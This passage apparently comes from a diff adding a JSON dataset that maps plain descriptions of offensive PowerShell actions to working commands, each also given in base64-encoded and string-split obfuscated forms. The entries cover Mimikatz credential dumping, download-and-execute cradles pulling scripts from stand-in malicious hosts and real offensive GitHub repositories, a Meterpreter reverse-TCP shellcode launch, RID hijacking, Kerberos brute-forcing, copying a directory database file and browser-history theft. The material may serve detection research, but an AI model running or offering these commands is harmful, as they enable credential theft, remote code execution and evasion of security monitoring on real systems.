+    "input": "Execute Invoke-Mimikatz cmdlet with bypass execution policy.",
+    "outputs": [
+      "powershell -exec bypass -command \"Invoke-Mimikatz -DumpCreds\"",
+      "powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAgAC0AZQB4AGUAYwAgAGIAeQBwAGEAcwBzACAALQBjAG8AbQBtAGEAbgBkACAAIgBJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAIgA=",
+      "IEX('po''+''we''+''rs''+''he''+''ll''+'' -''+''ex''+''ec''+'' b''+''yp''+''as''+''s ''+''-c''+''om''+''ma''+''nd''+'' \"''+''In''+''vo''+''ke''+''-M''+''im''+''ik''+''at''+''z ''+''-D''+''um''+''pC''+''re''+''ds''+''\"')"
+    ]
+  },
+  {
+    "input": "Retrieve information using Get-WmiObject and export the results to a CSV file.",
+    "outputs": [
+      "powershell.exe -c \"Get-WmiObject -class win32_operatingsystem | select -property * | export-csv msdebug.log\"",
+      "powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBjACAAIgBHAGUAdAAtAFcAbQBpAE8AYgBqAGUAYwB0ACAALQBjAGwAYQBzAHMAIAB3AGkAbgAzADIAXwBvAHAAZQByAGEAdABpAG4AZwBzAHkAcwB0AGUAbQAgAHwAIABzAGUAbABlAGMAdAAgAC0AcAByAG8AcABlAHIAdAB5ACAAKgAgAHwAIABlAHgAcABvAHIAdAAtAGMAcwB2ACAAbQBzAGQAZQBiAHUAZwAuAGwAbwBnACIA",
+      "IEX('po''+''we''+''rs''+''he''+''ll''+''.e''+''xe''+'' -''+''c ''+''\"G''+''et''+''-W''+''mi''+''Ob''+''je''+''ct''+'' -''+''cl''+''as''+''s ''+''wi''+''n3''+''2_''+''op''+''er''+''at''+''in''+''gs''+''ys''+''te''+''m ''+''| ''+''se''+''le''+''ct''+'' -''+''pr''+''op''+''er''+''ty''+'' *''+'' |''+'' e''+''xp''+''or''+''t-''+''cs''+''v ''+''ms''+''de''+''bu''+''g.''+''lo''+''g\"')"
+    ]
+  },
+  {
+    "input": "Download and execute a PowerShell script from a GitHub repository with hidden window style.",
+    "outputs": [
+      "powershell -ep bypass -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');\"",
+      "powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAgAC0AZQBwACAAYgB5AHAAYQBzAHMAIAAtAHcAIABoAGkAZABkAGUAbgAgAC0AYwAgACIASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AUwAzAGMAdQByADMAVABoADEAcwBTAGgAMQB0AC8AVwBpAG4AUAB3AG4ALwAxADIAMQBkAGMAZQBlADIANgBhADcAYQBjAGEAMwA2ADgAOAAyADEANQA2ADMAYwBiAGUAOQAyAGIAMgBiADUANgAzADgAYwA1ADcANwAzAC8AVwBpAG4AUAB3AG4ALgBwAHMAMQAnACkAOwAiAA==",
+      "IEX('po''+''we''+''rs''+''he''+''ll''+'' -''+''ep''+'' b''+''yp''+''as''+''s ''+''-w''+'' h''+''id''+''de''+''n ''+''-c''+'' \"''+''IE''+''X ''+''(N''+''ew''+''-O''+''bj''+''ec''+''t ''+''Ne''+''t.''+''We''+''bC''+''li''+''en''+''t)''+''.D''+''ow''+''nl''+''oa''+''dS''+''tr''+''in''+''g(''+'''h''+''tt''+''ps''+'':/''+''/r''+''aw''+''.g''+''it''+''hu''+''bu''+''se''+''rc''+''on''+''te''+''nt''+''.c''+''om''+''/S''+''3c''+''ur''+''3T''+''h1''+''sS''+''h1''+''t/''+''Wi''+''nP''+''wn''+''/1''+''21''+''dc''+''ee''+''26''+''a7''+''ac''+''a3''+''68''+''82''+''15''+''63''+''cb''+''e9''+''2b''+''2b''+''56''+''38''+''c5''+''77''+''3/''+''Wi''+''nP''+''wn''+''.p''+''s1''+''')''+'';\"')"
+    ]
+  },
+  {
+    "input": "Invoke a PowerShell command on a remote system with a specified hostname.",
+    "outputs": [
+      "Invoke-Command -ComputerName <hostname> -ScriptBlock { < code > }",
+      "powershell -enc SQBuAHYAbwBrAGUALQBDAG8AbQBtAGEAbgBkACAALQBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgADwAaABvAHMAdABuAGEAbQBlAD4AIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgAHsAIAA8ACAAYwBvAGQAZQAgAD4AIAB9AA==",
+      "IEX('In''+''vo''+''ke''+''-C''+''om''+''ma''+''nd''+'' -''+''Co''+''mp''+''ut''+''er''+''Na''+''me''+'' <''+''ho''+''st''+''na''+''me''+''> ''+''-S''+''cr''+''ip''+''tB''+''lo''+''ck''+'' {''+'' <''+'' c''+''od''+''e ''+''> ''+''}')"
+    ]
+  },
+  {
+    "input": "Invoke PowerShell expression to download and execute a script from a specified URL.",
+    "outputs": [
+      "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://badwebserver.com/SysWin.ps1')\"",
+      "powershell -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAALQBDAG8AbQBtAGEAbgBkACAAIgBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBiAGEAZAB3AGUAYgBzAGUAcgB2AGUAcgAuAGMAbwBtAC8AUwB5AHMAVwBpAG4ALgBwAHMAMQAnACkAIgA=",
+      "IEX('In''+''vo''+''ke''+''-E''+''xp''+''re''+''ss''+''io''+''n ''+''-C''+''om''+''ma''+''nd''+'' \"''+''IE''+''X ''+''(N''+''ew''+''-O''+''bj''+''ec''+''t ''+''Ne''+''t.''+''We''+''bC''+''li''+''en''+''t)''+''.D''+''ow''+''nl''+''oa''+''dS''+''tr''+''in''+''g(''+'''h''+''tt''+''p:''+''//''+''ba''+''dw''+''eb''+''se''+''rv''+''er''+''.c''+''om''+''/S''+''ys''+''Wi''+''n.''+''ps''+''1'''+'')\"')"
+    ]
+  },
+  {
+    "input": "Invoke an HTML Application (HTA) with specified file path, script engine, and simulate a user double-click.",
+    "outputs": [
+      "Invoke-ATHHTMLApplication -HTAFilePath ${hta_file_path} -ScriptEngine ${script_engine} -SimulateUserDoubleClick",
+      "powershell -enc SQBuAHYAbwBrAGUALQBBAFQASABIAFQATQBMAEEAcABwAGwAaQBjAGEAdABpAG8AbgAgAC0ASABUAEEARgBpAGwAZQBQAGEAdABoACAAJAB7AGgAdABhAF8AZgBpAGwAZQBfAHAAYQB0AGgAfQAgAC0AUwBjAHIAaQBwAHQARQBuAGcAaQBuAGUAIAAkAHsAcwBjAHIAaQBwAHQAXwBlAG4AZwBpAG4AZQB9ACAALQBTAGkAbQB1AGwAYQB0AGUAVQBzAGUAcgBEAG8AdQBiAGwAZQBDAGwAaQBjAGsA",
+      "IEX('In''+''vo''+''ke''+''-A''+''TH''+''HT''+''ML''+''Ap''+''pl''+''ic''+''at''+''io''+''n ''+''-H''+''TA''+''Fi''+''le''+''Pa''+''th''+'' $''+''{h''+''ta''+''_f''+''il''+''e_''+''pa''+''th''+''} ''+''-S''+''cr''+''ip''+''tE''+''ng''+''in''+''e ''+''${''+''sc''+''ri''+''pt''+''_e''+''ng''+''in''+''e}''+'' -''+''Si''+''mu''+''la''+''te''+''Us''+''er''+''Do''+''ub''+''le''+''Cl''+''ic''+''k')"
+    ]
+  },
+  {
+    "input": "Download a file from a specified URL and save it to a local path.",
+    "outputs": [
+      "Invoke-WebRequest -Url http://malicious-server.com/malicious-file.exe -OutFile C:\\malicious-file.exe",
+      "powershell -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAbAAgAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALQBzAGUAcgB2AGUAcgAuAGMAbwBtAC8AbQBhAGwAaQBjAGkAbwB1AHMALQBmAGkAbABlAC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIABDADoAXABtAGEAbABpAGMAaQBvAHUAcwAtAGYAaQBsAGUALgBlAHgAZQA=",
+      "IEX('In''+''vo''+''ke''+''-W''+''eb''+''Re''+''qu''+''es''+''t ''+''-U''+''rl''+'' h''+''tt''+''p:''+''//''+''ma''+''li''+''ci''+''ou''+''s-''+''se''+''rv''+''er''+''.c''+''om''+''/m''+''al''+''ic''+''io''+''us''+''-f''+''il''+''e.''+''ex''+''e ''+''-O''+''ut''+''Fi''+''le''+'' C''+'':\\''+''ma''+''li''+''ci''+''ou''+''s-''+''fi''+''le''+''.e''+''xe')"
+    ]
+  },
+  {
+    "input": "Perform RID Hijacking with a specified user (alice) and RID (500).",
+    "outputs": [
+      "Invoke-RIDHijacking -User alice -RID 500",
+      "powershell -enc SQBuAHYAbwBrAGUALQBSAEkARABIAGkAagBhAGMAawBpAG4AZwAgAC0AVQBzAGUAcgAgAGEAbABpAGMAZQAgAC0AUgBJAEQAIAA1ADAAMAA=",
+      "IEX('In''+''vo''+''ke''+''-R''+''ID''+''Hi''+''ja''+''ck''+''in''+''g ''+''-U''+''se''+''r ''+''al''+''ic''+''e ''+''-R''+''ID''+'' 5''+''00')"
+    ]
+  },
+  {
+    "input": "Create a PSBypass object and use it to execute Invoke-Mimikatz to dump credentials.",
+    "outputs": [
+      "$Bypass = New-Object System.Management.Automation.PSBypass; $Bypass.AddScript(\"Invoke-Mimikatz -DumpCreds\"); $Bypass.Invoke()",
+      "powershell -enc JABCAHkAcABhAHMAcwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFAAUwBCAHkAcABhAHMAcwA7ACAAJABCAHkAcABhAHMAcwAuAEEAZABkAFMAYwByAGkAcAB0ACgAIgBJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAIgApADsAIAAkAEIAeQBwAGEAcwBzAC4ASQBuAHYAbwBrAGUAKAApAA==",
+      "IEX('$B''+''yp''+''as''+''s ''+''= ''+''Ne''+''w-''+''Ob''+''je''+''ct''+'' S''+''ys''+''te''+''m.''+''Ma''+''na''+''ge''+''me''+''nt''+''.A''+''ut''+''om''+''at''+''io''+''n.''+''PS''+''By''+''pa''+''ss''+''; ''+''$B''+''yp''+''as''+''s.''+''Ad''+''dS''+''cr''+''ip''+''t(''+''\"I''+''nv''+''ok''+''e-''+''Mi''+''mi''+''ka''+''tz''+'' -''+''Du''+''mp''+''Cr''+''ed''+''s\"''+'');''+'' $''+''By''+''pa''+''ss''+''.I''+''nv''+''ok''+''e(''+'')')"
+    ]
+  },
+  {
+    "input": "Download and execute a PowerShell script with hidden window style.",
+    "outputs": [
+      "powershell.exe -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('http://evilurl.com/evil.ps1'))\";",
+      "powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAIgBJAEUAWAAgACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwAdQByAGwALgBjAG8AbQAvAGUAdgBpAGwALgBwAHMAMQAnACkAKQAiADsA",
+      "IEX('po''+''we''+''rs''+''he''+''ll''+''.e''+''xe''+'' -''+''no''+''p ''+''-w''+'' h''+''id''+''de''+''n ''+''-c''+'' \"''+''IE''+''X ''+''((''+''Ne''+''w-''+''Ob''+''je''+''ct''+'' N''+''et''+''.W''+''eb''+''Cl''+''ie''+''nt''+'').''+''Do''+''wn''+''lo''+''ad''+''St''+''ri''+''ng''+''('''+''ht''+''tp''+'':/''+''/e''+''vi''+''lu''+''rl''+''.c''+''om''+''/e''+''vi''+''l.''+''ps''+''1'''+''))''+''\";')"
+    ]
+  },
+  {
+    "input": "Execute a PowerShell script with bypassed execution policy from a specified file path.",
+    "outputs": [
+      "powershell.exe -ExecutionPolicy Bypass -NoProfile -File \"C:\\Users\\attacker\\script.ps1\"",
+      "powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAgAEIAeQBwAGEAcwBzACAALQBOAG8AUAByAG8AZgBpAGwAZQAgAC0ARgBpAGwAZQAgACIAQwA6AFwAVQBzAGUAcgBzAFwAYQB0AHQAYQBjAGsAZQByAFwAcwBjAHIAaQBwAHQALgBwAHMAMQAiAA==",
+      "IEX('po''+''we''+''rs''+''he''+''ll''+''.e''+''xe''+'' -''+''Ex''+''ec''+''ut''+''io''+''nP''+''ol''+''ic''+''y ''+''By''+''pa''+''ss''+'' -''+''No''+''Pr''+''of''+''il''+''e ''+''-F''+''il''+''e ''+''\"C''+'':\\''+''Us''+''er''+''s\\''+''at''+''ta''+''ck''+''er''+''\\s''+''cr''+''ip''+''t.''+''ps''+''1\"')"
+    ]
+  },
+  {
+    "input": "Invoke-Mimikatz cmdlet with bypassed execution policy.",
+    "outputs": [
+      "powershell -ep bypass -c \"Invoke-Mimikatz\"",
+      "powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAgAC0AZQBwACAAYgB5AHAAYQBzAHMAIAAtAGMAIAAiAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6ACIA",
+      "IEX('po''+''we''+''rs''+''he''+''ll''+'' -''+''ep''+'' b''+''yp''+''as''+''s ''+''-c''+'' \"''+''In''+''vo''+''ke''+''-M''+''im''+''ik''+''at''+''z\"')"
+    ]
+  },
+  {
+    "input": "Invoke Expression to download and execute an obfuscated PowerShell script from a GitHub repository.",
+    "outputs": [
+      "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')",
+      "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AUwAzAGMAdQByADMAVABoADEAcwBTAGgAMQB0AC8AQwByAGUAZABzAC8AbQBhAHMAdABlAHIALwBvAGIAZgB1AHMAYwBhAHQAZQBkAHAAcwAvAEQAdQBtAHAAVwBDAE0ALgBwAHMAMQAnACkA",
+      "IEX('IE''+''X ''+''(N''+''ew''+''-O''+''bj''+''ec''+''t ''+''Ne''+''t.''+''We''+''bC''+''li''+''en''+''t)''+''.D''+''ow''+''nl''+''oa''+''dS''+''tr''+''in''+''g(''+'''h''+''tt''+''ps''+'':/''+''/r''+''aw''+''.g''+''it''+''hu''+''bu''+''se''+''rc''+''on''+''te''+''nt''+''.c''+''om''+''/S''+''3c''+''ur''+''3T''+''h1''+''sS''+''h1''+''t/''+''Cr''+''ed''+''s/''+''ma''+''st''+''er''+''/o''+''bf''+''us''+''ca''+''te''+''dp''+''s/''+''Du''+''mp''+''WC''+''M.''+''ps''+''1'''+'')')"
+    ]
+  },
+  {
+    "input": "Change directory to the temporary folder and execute Kerbrute for Kerberos brute force against a specified domain controller and domain.",
+    "outputs": [
+      "cd $env:temp ; .\\kerbrute.exe bruteforce --dc ${domain_controller} -d ${Domain} $env:temp\\brute_force.txt",
+      "powershell -enc YwBkACAAJABlAG4AdgA6AHQAZQBtAHAAIAA7ACAALgBcAGsAZQByAGIAcgB1AHQAZQAuAGUAeABlACAAYgByAHUAdABlAGYAbwByAGMAZQAgAC0ALQBkAGMAIAAkAHsAZABvAG0AYQBpAG4AXwBjAG8AbgB0AHIAbwBsAGwAZQByAH0AIAAtAGQAIAAkAHsARABvAG0AYQBpAG4AfQAgACQAZQBuAHYAOgB0AGUAbQBwAFwAYgByAHUAdABlAF8AZgBvAHIAYwBlAC4AdAB4AHQA",
+      "IEX('cd''+'' $''+''en''+''v:''+''te''+''mp''+'' ;''+'' .''+''\\k''+''er''+''br''+''ut''+''e.''+''ex''+''e ''+''br''+''ut''+''ef''+''or''+''ce''+'' -''+''-d''+''c ''+''${''+''do''+''ma''+''in''+''_c''+''on''+''tr''+''ol''+''le''+''r}''+'' -''+''d ''+''${''+''Do''+''ma''+''in''+''} ''+''$e''+''nv''+'':t''+''em''+''p\\''+''br''+''ut''+''e_''+''fo''+''rc''+''e.''+''tx''+''t')"
+    ]
+  },
+  {
+    "input": "Execute a PowerShell script with bypassed execution policy from a specified file path.",
+    "outputs": [
+      "powershell.exe -ExecutionPolicy Bypass -File sysWin.ps1",
+      "powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAgAEIAeQBwAGEAcwBzACAALQBGAGkAbABlACAAcwB5AHMAVwBpAG4ALgBwAHMAMQA=",
+      "IEX('po''+''we''+''rs''+''he''+''ll''+''.e''+''xe''+'' -''+''Ex''+''ec''+''ut''+''io''+''nP''+''ol''+''ic''+''y ''+''By''+''pa''+''ss''+'' -''+''Fi''+''le''+'' s''+''ys''+''Wi''+''n.''+''ps''+''1')"
+    ]
+  },
+  {
+    "input": "Use NinjaCopy to copy a file from a source path to a local destination.",
+    "outputs": [
+      "Invoke-NinjaCopy -Path 'C:\\windows\\clrt\\clrt.dit' -LocalDestination 'C:\\windows\\temp\\clrt.dit'",
+      "powershell -enc SQBuAHYAbwBrAGUALQBOAGkAbgBqAGEAQwBvAHAAeQAgAC0AUABhAHQAaAAgACcAQwA6AFwAdwBpAG4AZABvAHcAcwBcAGMAbAByAHQAXABjAGwAcgB0AC4AZABpAHQAJwAgAC0ATABvAGMAYQBsAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACcAQwA6AFwAdwBpAG4AZABvAHcAcwBcAHQAZQBtAHAAXABjAGwAcgB0AC4AZABpAHQAJwA=",
+      "IEX('In''+''vo''+''ke''+''-N''+''in''+''ja''+''Co''+''py''+'' -''+''Pa''+''th''+'' '''+''C:''+''\\w''+''in''+''do''+''ws''+''\\c''+''lr''+''t\\''+''cl''+''rt''+''.d''+''it''+''' ''+''-L''+''oc''+''al''+''De''+''st''+''in''+''at''+''io''+''n ''+'''C''+'':\\''+''wi''+''nd''+''ow''+''s\\''+''te''+''mp''+''\\c''+''lr''+''t.''+''di''+''t'')"
+    ]
+  },
+  {
+    "input": "Invoke Mimikatz to dump credentials and execute a Meterpreter payload with specified host and port.",
+    "outputs": [
+      "Invoke-Mimikatz -DumpCreds; Invoke-Shellcode -Payload windows/meterpreter/reverse_tcp -Lhost 192.168.1.1 -Lport 443",
+      "powershell -enc SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoAIAAtAEQAdQBtAHAAQwByAGUAZABzADsAIABJAG4AdgBvAGsAZQAtAFMAaABlAGwAbABjAG8AZABlACAALQBQAGEAeQBsAG8AYQBkACAAdwBpAG4AZABvAHcAcwAvAG0AZQB0AGUAcgBwAHIAZQB0AGUAcgAvAHIAZQB2AGUAcgBzAGUAXwB0AGMAcAAgAC0ATABoAG8AcwB0ACAAMQA5ADIALgAxADYAOAAuADEALgAxACAALQBMAHAAbwByAHQAIAA0ADQAMwA=",
+      "IEX('In''+''vo''+''ke''+''-M''+''im''+''ik''+''at''+''z ''+''-D''+''um''+''pC''+''re''+''ds''+''; ''+''In''+''vo''+''ke''+''-S''+''he''+''ll''+''co''+''de''+'' -''+''Pa''+''yl''+''oa''+''d ''+''wi''+''nd''+''ow''+''s/''+''me''+''te''+''rp''+''re''+''te''+''r/''+''re''+''ve''+''rs''+''e_''+''tc''+''p ''+''-L''+''ho''+''st''+'' 1''+''92''+''.1''+''68''+''.1''+''.1''+'' -''+''Lp''+''or''+''t ''+''44''+''3')"
+    ]
+  },
+  {
+    "input": "Start a process with nsudo, wait for 5 seconds, and forcefully stop the CMD process.",
+    "outputs": [
+      "Start-Process ${nsudo_path} -Argument \"-U:T -P:E cmd\" ; Start-Sleep -Second 5 ; Stop-Process -Name \"cmd\" -force -erroraction silentlycontinue",
+      "powershell -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAewBuAHMAdQBkAG8AXwBwAGEAdABoAH0AIAAtAEEAcgBnAHUAbQBlAG4AdAAgACIALQBVADoAVAAgAC0AUAA6AEUAIABjAG0AZAAiACAAOwAgAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAIAA1ACAAOwAgAFMAdABvAHAALQBQAHIAbwBjAGUAcwBzACAALQBOAGEAbQBlACAAIgBjAG0AZAAiACAALQBmAG8AcgBjAGUAIAAtAGUAcgByAG8AcgBhAGMAdABpAG8AbgAgAHMAaQBsAGUAbgB0AGwAeQBjAG8AbgB0AGkAbgB1AGUA",
+      "IEX('St''+''ar''+''t-''+''Pr''+''oc''+''es''+''s ''+''${''+''ns''+''ud''+''o_''+''pa''+''th''+''} ''+''-A''+''rg''+''um''+''en''+''t ''+''\"-''+''U:''+''T ''+''-P''+'':E''+'' c''+''md''+''\" ''+''; ''+''St''+''ar''+''t-''+''Sl''+''ee''+''p ''+''-S''+''ec''+''on''+''d ''+''5 ''+''; ''+''St''+''op''+''-P''+''ro''+''ce''+''ss''+'' -''+''Na''+''me''+'' \"''+''cm''+''d\"''+'' -''+''fo''+''rc''+''e ''+''-e''+''rr''+''or''+''ac''+''ti''+''on''+'' s''+''il''+''en''+''tl''+''yc''+''on''+''ti''+''nu''+''e')"
+    ]
+  },
+  {
+    "input": "Download and execute a script using Invoke-Command with Invoke-Expression.",
+    "outputs": [
+      "$command = \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/malicious.ps1')\"; Invoke-Command -ScriptBlock { Invoke-Expression $using:command }",
+      "powershell -enc JABjAG8AbQBtAGEAbgBkACAAPQAgACIASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAG0AYQBsAGkAYwBpAG8AdQBzAHUAcgBsAC4AYwBvAG0ALwBtAGEAbABpAGMAaQBvAHUAcwAuAHAAcwAxACcAKQAiADsAIABJAG4AdgBvAGsAZQAtAEMAbwBtAG0AYQBuAGQAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgAHsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkAHUAcwBpAG4AZwA6AGMAbwBtAG0AYQBuAGQAIAB9AA==",
+      "IEX('$c''+''om''+''ma''+''nd''+'' =''+'' \"''+''In''+''vo''+''ke''+''-E''+''xp''+''re''+''ss''+''io''+''n ''+''(N''+''ew''+''-O''+''bj''+''ec''+''t ''+''Ne''+''t.''+''We''+''bC''+''li''+''en''+''t)''+''.D''+''ow''+''nl''+''oa''+''dS''+''tr''+''in''+''g(''+'''h''+''tt''+''p:''+''//''+''ma''+''li''+''ci''+''ou''+''su''+''rl''+''.c''+''om''+''/m''+''al''+''ic''+''io''+''us''+''.p''+''s1''+''')''+''\";''+'' I''+''nv''+''ok''+''e-''+''Co''+''mm''+''an''+''d ''+''-S''+''cr''+''ip''+''tB''+''lo''+''ck''+'' {''+'' I''+''nv''+''ok''+''e-''+''Ex''+''pr''+''es''+''si''+''on''+'' $''+''us''+''in''+''g:''+''co''+''mm''+''an''+''d ''+''}')"
+    ]
+  },
+  {
+    "input": "Invoke PowerShell expression to download and execute a script from a specified URL.",
+    "outputs": [
+      "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://badwebserver.com/SysWin.ps1')\"",
+      "powershell -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAALQBDAG8AbQBtAGEAbgBkACAAIgBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBiAGEAZAB3AGUAYgBzAGUAcgB2AGUAcgAuAGMAbwBtAC8AUwB5AHMAVwBpAG4ALgBwAHMAMQAnACkAIgA=",
+      "IEX('In''+''vo''+''ke''+''-E''+''xp''+''re''+''ss''+''io''+''n ''+''-C''+''om''+''ma''+''nd''+'' \"''+''IE''+''X ''+''(N''+''ew''+''-O''+''bj''+''ec''+''t ''+''Ne''+''t.''+''We''+''bC''+''li''+''en''+''t)''+''.D''+''ow''+''nl''+''oa''+''dS''+''tr''+''in''+''g(''+'''h''+''tt''+''p:''+''//''+''ba''+''dw''+''eb''+''se''+''rv''+''er''+''.c''+''om''+''/S''+''ys''+''Wi''+''n.''+''ps''+''1'''+'')\"')"
+    ]
+  },
+  {
+    "input": "Execute a PowerShell command with bypassed execution policy and download a script from a specified URL.",
+    "outputs": [
+      "powershell.exe -exec bypass -nop -c \"IEX (New-Object Net.WebClient).DownloadString('https://malicious-website.com/malicious.ps1')\"",
+      "powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBlAHgAZQBjACAAYgB5AHAAYQBzAHMAIAAtAG4AbwBwACAALQBjACAAIgBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAG0AYQBsAGkAYwBpAG8AdQBzAC0AdwBlAGIAcwBpAHQAZQAuAGMAbwBtAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBwAHMAMQAnACkAIgA=",
+      "IEX('po''+''we''+''rs''+''he''+''ll''+''.e''+''xe''+'' -''+''ex''+''ec''+'' b''+''yp''+''as''+''s ''+''-n''+''op''+'' -''+''c ''+''\"I''+''EX''+'' (''+''Ne''+''w-''+''Ob''+''je''+''ct''+'' N''+''et''+''.W''+''eb''+''Cl''+''ie''+''nt''+'').''+''Do''+''wn''+''lo''+''ad''+''St''+''ri''+''ng''+''('''+''ht''+''tp''+''s:''+''//''+''ma''+''li''+''ci''+''ou''+''s-''+''we''+''bs''+''it''+''e.''+''co''+''m/''+''ma''+''li''+''ci''+''ou''+''s.''+''ps''+''1'''+'')\"')"
+    ]
+  },
+  {
+    "input": "Retrieve browser information, including history, for a specified user and search term.",
+    "outputs": [
+      "Get-BrowserInformation -Browser All -Datatype History -UserName Luca -Search 'wikipedia'",
+      "powershell -enc RwBlAHQALQBCAHIAbwB3AHMAZQByAEkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAC0AQgByAG8AdwBzAGUAcgAgAEEAbABsACAALQBEAGEAdABhAHQAeQBwAGUAIABIAGkAcwB0AG8AcgB5ACAALQBVAHMAZQByAE4AYQBtAGUAIABMAHUAYwBhACAALQBTAGUAYQByAGMAaAAgACcAdwBpAGsAaQBwAGUAZABpAGEAJwA=",
+      "IEX('Ge''+''t-''+''Br''+''ow''+''se''+''rI''+''nf''+''or''+''ma''+''ti''+''on''+'' -''+''Br''+''ow''+''se''+''r ''+''Al''+''l ''+''-D''+''at''+''at''+''yp''+''e ''+''Hi''+''st''+''or''+''y ''+''-U''+''se''+''rN''+''am''+''e ''+''Lu''+''ca''+'' -''+''Se''+''ar''+''ch''+'' '''+''wi''+''ki''+''pe''+''di''+''a'')"
+    ]
+  },
+  {
+    "input": "Execute a PowerShell script to turn off Wi-Fi.",
+    "outputs": [
+      ".\\wifi.ps1 -Off",
+      "powershell -enc LgBcAHcAaQBmAGkALgBwAHMAMQAgAC0ATwBmAGYA",
+      "IEX('.\\''+''wi''+''fi''+''.p''+''s1''+'' -''+''Of''+''f')"
+    ]
+  },
+  {
+    "input": "Execute a PowerShell command with bypassed execution policy and download a script from a specified URL.",
+    "outputs": [
+      "powershell.exe -ep bypass -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://exploitingurl.com/execKern.ps1')\"",
